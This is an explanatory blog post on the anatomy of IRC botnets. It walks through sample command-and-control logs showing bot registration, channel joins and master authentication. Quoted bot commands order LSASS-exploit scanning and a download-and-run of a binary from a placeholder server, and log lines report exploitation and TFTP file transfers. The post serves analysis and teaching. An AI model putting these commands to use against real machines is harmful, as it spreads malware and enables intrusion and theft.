---
layout: post
title:  "How Bots and Botnets work"
date:   2015-01-30 10:21:50
categories: anatomy
---

This section will in detail explain how bots spread and how they are controlled by their masters.

The term `botnet` is widely used when several IRC bots have been linked and may possibly set channel modes on other bots and users while keeping IRC channels free from unwanted users. 
This is where the term is originally from, since the first illegal botnets were similar to legal botnets.

Botnets sometimes compromise computers whose security defenses have been breached and control conceded to a third party. Each such compromised device, known as a "bot", is created when a computer is penetrated by software from a malware (malicious software) distribution. However, it could also be someone (or a spider) that hacks into a computer. The controller of a botnet is able to direct the activities of these compromised computers through communication channels formed by standards-based network protocols such as IRC, Hypertext Transfer Protocol (HTTP), etc..`[1]`

*Reference* ["Bots &; Botnet: An Overview"](http://www.sans.org/reading-room/whitepapers/malicious/bots-botnet-overview-1299)[1]

After successful exploitation, a bot uses Trivial File Transfer Protocol (TFTP), File Transfer Protocol (FTP), HyperText Transfer Protocol (HTTP), or CSend (an IRC extension to send files to other users, comparable to DCC) to transfer itself to the compromised host. The binary is started, and tries to connect to the hard-coded master IRC server. Often a dynamic DNS name is provided rather than a hard coded IP address, so the bot can be easily relocated. Some bots even remove themselves if the given master server is localhost or in a private subnet, since this indicates an unusual situations. Using a special crafted nickname like EU\|743634 or [UrX]-98439854 the bot tries to join the master's channel, sometimes using a password to keep strangers out of the channel. A typical communication that can be observed after a successful infection looks like:

{% highlight irc %}
<- :irc1.XXXXXX.XXX NOTICE AUTH :*** Looking up your hostname...
<- :irc1.XXXXXX.XXX NOTICE AUTH :*** Found your hostname
-> PASS secretserverpass
-> NICK [urX]-700159
-> USER mltfvt 0 0 :mltfvt
<- :irc1.XXXXXX.XXX NOTICE [urX]-700159 :*** If you are having problems connecting due to ping timeouts, please type /quote pong ED322722 or /raw pong ED322722 now.
<- PING :ED322722
-> PONG :ED322722
<- :irc1.XXXXXX.XXX 001 [urX]-700159 :Welcome to the irc1.XXXXXX.XXX IRC Network [urX]-700159!mltfvt@nicetry
<- :irc1.XXXXXX.XXX 002 [urX]-700159 :Your host is irc1.XXXXXX.XXX, running version Unreal3.2-beta19
<- :irc1.XXXXXX.XXX 003 [urX]-700159 :This server was created Sun Feb  8 18:58:31 2004
<- :irc1.XXXXXX.XXX 004 [urX]-700159 irc1.XXXXXX.XXX Unreal3.2-beta19 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeKVfMGCuzN
{% endhighlight %}

Afterwards, the server accepts the bot as a client and sends him RPL_ISUPPORT, RPL_MOTDSTART, RPL_MOTD, RPL_ENDOFMOTD or ERR_NOMOTD. Replies starting with RPL_ contain information for the client, for example RPL_ISUPPORT tells the client which features the server understands and RPL_MOTD indicates the Message Of The Day (MOTD). In contrast to this, ERR_NOMOTD is an error message if no MOTD is available. 

On RPL_ENDOFMOTD or ERR_NOMOTD, the bot will try to join his master's channel with the provided password:

{% highlight irc %}
-> JOIN #botnet channelpassword
-> MODE [urX]-700159 +x
{% endhighlight %}

The bot receives the topic of the channel and interprets it as a command:
{% highlight irc %}
<- :irc1.XXXXXX.XXX 332 [urX]-700159 #botnet :.advscan lsass 200 5 0 -r -s
<- :[urX]-700159!mltfvt@nicetry JOIN :#botnet
<- :irc1.XXXXXX.XXX MODE #botnet +smntuk channelpassword
{% endhighlight %}
Most botnets use a topic command like:

**1.**	`".advscan lsass 200 5 0 -r -s"`

**2.**	`".http.update http://<server>/~mugenxu/rBot.exe c:\msy32awds.exe 1"`

The first topic tells the bot to spread further with the help of the LSASS vulnerability`[2]`. 200 concurrent threads should scan with a delay of 5 seconds for an unlimited time (parameter 0). The scans should be random (parameter -r) and silent (parameter -s), thus avoiding too much traffic due to status reports. In contrast to this, the second example of a possible topic instructs the bot to download a binary from the web and execute it (parameter 1). And if the topic does not contain any instructions for the bot, then it does nothing but idling in the channel, awaiting commands. That is fundamental for most current bots: They do not spread if they are not told to spread in their master's channel.
Upon successful exploitation the bot will message the owner about it, if it has been advised to do so.

*Reference* [LSASS vulnerability](https://technet.microsoft.com/library/security/ms04-011)[2]

{% highlight irc %}
-> PRIVMSG #botnet :[lsass]: Exploiting IP: 200.124.175.XXX
-> PRIVMSG #botnet :[TFTP]: File transfer started to IP: 200.124.175.XXX (C:\WINDOWS\System32\NAV.exe).
{% endhighlight %}

Then the IRC server (also called IRC daemon, abbreviated IRCd) will provide the channels userlist. But most botnet owners have modified the IRCd to just send the channel operators to save traffic and disguise the number of bots in the channel.

{% highlight irc %}
<- :irc1.XXXXXX.XXX 353 [urX]-700159 @ #botnet :@JAH
<- :irc1.XXXXXX.XXX 366 [urX]-700159 #botnet :End of /NAMES list.
<- :irc1.XXXXXX.XXX NOTICE [urX]-700159 :BOTMOTD File not found
<- :[urX]-700159 MODE [urX]-700159 :+x
{% endhighlight %}

The controller of a botnet has to authenticate himself to take control over the bots. This authentication is done with the help of a command prefix and the "auth" command. The command prefix is used to login the master on the bots and afterwards he has to authenticate himself. For example,

{% highlight irc %}
.login leet0
.la plmp -s
{% endhighlight %}


are commands used on different bots to approve the controller. Again, the "-s" switch in the last example tells the bots to be silent when authenticating their master. Else they reply something like

{% highlight irc %}
[MAIN]: Password accepted.
[r[X]-Sh0[x]]: .:( Password Acepted ):. .
{% endhighlight %}

which can be a lot of traffic if you have 10,000 bots on your network. Once an attacker is authenticated, they can do whatever they want with the bots: Searching for sensitive information on all compromised machines and DCC-sending these files to another machine, DDoS-ing individuals or organizations, or enabling a keylogger and looking for PayPal or eBay account information. These are just a few possible commands, other options have been presented in the previous section. The IRC server that is used to connect all bots is in most cases a compromised box. This is probably because an attacker would not receive operator-rights on a normal chat network and thus has to set-up their own IRC server which offers more flexibility.

Two different IRC servers software implementation are commonly used to run a botnet: Unreal IRCd and ConferenceRoom:

* **Unreal IRCd`[3]`**

	It's cross-platform and can thus be used to easily link machines running Windows and Linux. The IRC server software is stripped down and modified to fit the botnet owner’s needs.
	Common modifications we have noticed are stripping "JOIN", "PART" and "QUIT" messages on channels to avoid unnecessary traffic. In addition, the messages "LUSERS" (information about number of connected clients) and "RPL_ISUPPORT" are removed to hide identity and botnet size. 
	Size comes in great value given that botnet with over 80k+ bots are used by cyber criminals for "professional" attacks probably being to most profitable of uses for botnets, also the riskier. These kind of networks can cause severe damage since they offer a lot of bandwidth and many targets for identity theft.
	
	*Reference*: [Unreal IRCd](http://www.unrealircd.com/)[3]

* **ConferenceRoom`[4]`**

	It's a commercial IRCd solution, but people who run botnets typically use a cracked version. ConferenceRoom offers the possibility of several thousand simultaneous connections, with nickname and channel registration, buddy lists and server to server linking.
	Since the people who run botnets often share the same motives (DDoS attacks or other crimes) every bot family has its own set of commands to implement the same goals. Agobot is really nice here: Just grep the source for RegisterCommand and get the whole command-list with a complete description of all features. Due to the lack of clean design, the whole SDBot family is harder to analyse. Often the command set is changed in various forks of the same bot and thus an automated analysis of the implemented commands is nearly impossible. 

	*Reference*: [ConferenceRoom](http://www.webmaster.com/) [4]
	
Botnets are increasingly rented out by cyber criminals as commodities for a variety of purposes.`[5]`

*Reference* ["Novice cyberciminals offer commercial access to five mini botnets"](http://www.webroot.com/blog/2013/10/11/novice-cyberciminals-offer-commercial-access-5-mini-botnets/)[5]